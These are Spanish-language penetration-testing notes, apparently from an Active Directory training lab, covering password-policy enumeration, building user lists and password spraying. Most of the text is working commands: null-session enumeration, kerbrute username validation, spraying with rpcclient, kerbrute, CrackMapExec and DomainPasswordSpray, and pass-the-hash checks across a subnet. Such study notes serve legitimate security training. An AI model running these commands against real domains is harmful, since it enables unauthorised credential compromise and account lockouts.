# 3. Hunting For A User — Password Policy & Spraying

## Enumeración de Política de Contraseñas

Antes de hacer spraying hay que conocer el umbral de bloqueo para no bloquear cuentas.

---

## Desde Linux

### CME con credenciales

```c
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

### rpcclient — Null session

```c
rpcclient -U "" -N 172.16.5.5
rpcclient $> querydominfo
rpcclient $> getdompwinfo
rpcclient $> enumdomusers
```

### enum4linux

```c
enum4linux -P 172.16.5.5
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

### enum4linux-ng (salida más limpia)

```c
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```

### ldapsearch — Anonymous LDAP bind

```c
ldapsearch -H ldap://172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

### Null session desde Windows

```c
net use \\DC01\ipc$ "" /u:""
```

Errores útiles para reconocimiento:

- `System error 1331` → cuenta deshabilitada
- `System error 1326` → contraseña incorrecta
- `System error 1909` → cuenta bloqueada

## Construir Lista de Usuarios

### enum4linux

```c
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

### rpcclient

```c
rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers
```

### CME

```c
crackmapexec smb 172.16.5.5 --users
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

### ldapsearch anonymous

```c
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```

### windapsearch

```c
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

### Kerbrute — Validar usuarios sin autenticación

```c
# Enumerar usuarios y guardar output a archivo
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_users.txt

# Sin archivo de salida
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

Kerbrute usa pre-autenticación Kerberos para validar usuarios sin generar eventos de login fallido. Si encuentra un usuario sin pre-auth, vuelca el AS-REP automáticamente.

Recursos de usuarios: [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames), [linkedin2username](https://github.com/initstring/linkedin2username)

## Password Spraying

### Desde Linux

#### Bash one-liner con rpcclient

```c
for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

#### Kerbrute

```c
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

#### CrackMapExec — Spray y validar

```c
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

#### CME — Verificar credencial válida

```c
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

#### CME — Validar admin local con hash en subred

```c
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

### Desde Windows

#### DomainPasswordSpray.ps1

- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)

```c
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

Construye la lista de usuarios automáticamente desde el dominio actual y respeta la política de bloqueo.
